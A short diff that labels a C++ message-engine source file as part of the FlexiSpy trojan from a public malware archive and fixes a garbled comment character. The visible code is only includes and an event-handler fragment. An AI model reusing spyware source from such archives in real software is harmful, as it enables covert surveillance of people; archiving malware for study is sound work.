@@ -1,3 +1,14 @@
+/*
+  name      FlexiSpy
+  type      trojan
+  cve       —
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     —
+ */
 #include "FxsMsgEngine.h"
 #include "CltDatabase.h"
 #include "Fxsevendef.h"
@@ -147,7 +158,7 @@ void CFxsMsgEngine::HandleSessionEventL(TMsvSessionEvent aEvent, TAny* aArg1, TA
 				}
 			}break;
 		case EMsvServerTerminated:
-		case EMsvServerFailedToStart:// Something went wrong�
+		case EMsvServerFailedToStart:// Something went wrong�
 		case EMsvCloseSession:
 		default:
 			;
